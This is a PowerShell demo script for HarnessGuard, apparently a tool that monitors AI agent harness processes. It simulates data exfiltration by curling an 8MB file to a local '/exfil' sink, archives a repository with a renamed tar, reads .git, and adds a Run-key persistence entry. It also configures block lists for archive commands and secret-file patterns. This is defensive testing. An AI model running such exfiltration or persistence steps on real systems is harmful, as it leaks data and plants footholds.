# HarnessGuard M1 端到端演示（需管理员 PowerShell 运行）
# 场景：A 读 .git 阻断；B evilpack(tar 副本) 命令封堵；C curl 上传 8MB 超 5MB 阈值断连接；
#       D RunKey 持久化告警；E Web API 查证据。
# 说明：全部场景使用系统自带工具（cmd/tar/curl）模拟 harness 子进程行为；
#       不使用编码命令或裸 TCP 写（避免触发杀软 ML 误报——实测教训）。
# 复跑：powershell -ExecutionPolicy Bypass -File demos/m1-demo.ps1（产物在 target/demo/）

$ErrorActionPreference = 'Continue'
$root = "D:\develop\runlefei\HarnessGuard"
$demo = Join-Path $root "target\demo"
$exe  = Join-Path $root "target\release\harnessguard.exe"

"== HarnessGuard M1 演示 开始 $(Get-Date -Format HH:mm:ss) =="

# ---------- 0. 清场与造景 ----------
Stop-Process -Name harnessguard -Force -ErrorAction SilentlyContinue
Start-Sleep 1
Remove-Item -Recurse -Force $demo -ErrorAction SilentlyContinue
New-Item -ItemType Directory -Force -Path "$demo\repo\.git" | Out-Null
Set-Content "$demo\repo\.git\config" "[core]`nrepositoryformatversion = 0"
Set-Content "$demo\repo\.env" "SECRET=demo-secret"
Set-Content "$demo\repo\main.rs" "fn main() {}"
# 8MB 全零载荷（fsutil 秒建；避免随机数据/大字符串拼接触发杀软或 PS 限制——实测教训）
fsutil file createnew "$demo\big.bin" 8388608 | Out-Null
Copy-Item "C:\Windows\System32\cmd.exe" "$demo\fake_harness.exe" -Force
Copy-Item "C:\Windows\System32\tar.exe" "$demo\evilpack.exe" -Force

# ---------- 1. 配置 ----------
@'
[network]
upload_threshold_mb = 5
sensitive_escalation_divisor = 10

[endpoints]
allow = ["api.anthropic.com", "*.github.com"]

[files]
git_dir_action = "block"
archive_action = "block"
sensitive_patterns = [".env", ".env.*", "*_rsa", "*.pem", "*credentials*"]
archive_patterns = ["*.zip", "*.tar", "*.tar.gz", "*.tgz", "*.7z", "*.gz", "*.zst"]

[commands]
blocked = ["git archive*", "git bundle*", "git format-patch*", "tar *", "zip *", "7z *", "gzip *", "zstd *", "evil*"]

[[processes.harness]]
name = "fake-harness"
paths = ["**/fake_harness.exe"]

[[tool_exempt]]
exe = "git"
allow_paths = [".git/**"]

[storage]
retention_days = 30
max_disk_mb = 500
db_path = "harnessguard.db"

[web]
bind = "127.0.0.1:8377"
'@ | Set-Content "$demo\config.toml" -Encoding ascii

# ---------- 2. 本地接收端（模拟外传目标，HttpListener 200） ----------
$sinkScript = '$l=[System.Net.HttpListener]::new();$l.Prefixes.Add("http://127.0.0.1:18080/");$l.Start();try{while($true){$c=$l.GetContext();$c.Response.StatusCode=200;$c.Response.Close()}}catch{}'
$sink = Start-Process powershell -ArgumentList '-NoProfile','-Command',$sinkScript -WindowStyle Hidden -PassThru

# ---------- 3. 启动 HarnessGuard ----------
$env:RUST_LOG = 'info,hg_plat_win=debug,hg_core=debug'
$svc = Start-Process $exe -ArgumentList "$demo\config.toml" -WorkingDirectory $demo `
    -WindowStyle Hidden -PassThru `
    -RedirectStandardOutput "$demo\svc.out.log" -RedirectStandardError "$demo\svc.err.log"
Start-Sleep 4
$token = $null
try { $token = (Select-String -Path "$demo\svc.out.log" -Pattern 'token=([0-9a-f]+)').Matches[0].Groups[1].Value } catch {}
if (-not $token) { "!! 服务未产出 token："; Get-Content "$demo\svc.out.log"; Get-Content "$demo\svc.err.log"; exit 1 }
"服务已启动 token=$token"
$H = @{ Authorization = "Bearer $token" }

# ---------- 4. 场景 A：harness 树内读 .git → 阻断 + 杀 ----------
"[场景 A] fake_harness(cmd) 用 type 读 repo\.git\config（期望：git-dir Block + 杀进程）"
Push-Location $demo
& "$demo\fake_harness.exe" /c "type repo\.git\config" 2>&1 | Out-Null
Pop-Location
Start-Sleep 2

# ---------- 5. 场景 B：evilpack(tar 副本) 命令封堵 + 杀 ----------
"[场景 B] fake_harness 树内 evilpack.exe 打包 repo（期望：cmd-block Block + 杀进程）"
Push-Location $demo
& "$demo\fake_harness.exe" /c "$demo\evilpack.exe -czf out.tar.gz repo" 2>&1 | Out-Null
Pop-Location
Start-Sleep 2

# ---------- 6. 场景 C：树内 curl 上传 8MB（>5MB 阈值）→ 断连接 + 杀 ----------
"[场景 C] fake_harness 树内 curl POST 8MB 到 127.0.0.1:18080（期望：net-threshold Block + 断连接；回环不封 IP）"
Push-Location $demo
& "$demo\fake_harness.exe" /c "curl -s -m 30 --data-binary @big.bin http://127.0.0.1:18080/exfil" 2>&1 | Out-Null
Pop-Location
Start-Sleep 3

# ---------- 7. 场景 D：RunKey 持久化（轮询 30s） ----------
"[场景 D] 写入 HKCU RunKey（期望：persistence Audit 告警，~30s 内）"
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v HgDemo /d "cmd /c echo hi" /f | Out-Null
Start-Sleep 35

# ---------- 8. 场景 E：API 查证据 ----------
"[场景 E] /api/status"
try { (Invoke-RestMethod -Headers $H "http://127.0.0.1:8377/api/status") | ConvertTo-Json -Depth 4 } catch { "status 查询失败：$_" }
"`n[场景 E] /api/verdicts（UI Dashboard 同数据源）"
try {
  $vs = Invoke-RestMethod -Headers $H "http://127.0.0.1:8377/api/verdicts?limit=20"
  $vs | ForEach-Object { "{0}  {1,-8} {2,-15} pid={3,-6} {4}" -f ([DateTimeOffset]::FromUnixTimeMilliseconds($_.ts).LocalDateTime.ToString("HH:mm:ss")), $_.action, $_.rule_id, $_.pid, $_.evidence.summary }
  "共 $($vs.Count) 条判定（详细证据 JSON 可在 Web UI 点击行查看）"
} catch { "verdicts 查询失败：$_" }

# ---------- 8.5 日志副本 ----------
Copy-Item "$demo\svc.out.log" "$demo\svc.last.log" -Force

# ---------- 9. 清场 ----------
Stop-Process -Id $svc.Id -Force -ErrorAction SilentlyContinue
Stop-Process -Id $sink.Id -Force -ErrorAction SilentlyContinue
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v HgDemo /f 2>$null | Out-Null
"`n== 演示结束 $(Get-Date -Format HH:mm:ss)（复跑请重新执行本脚本）=="
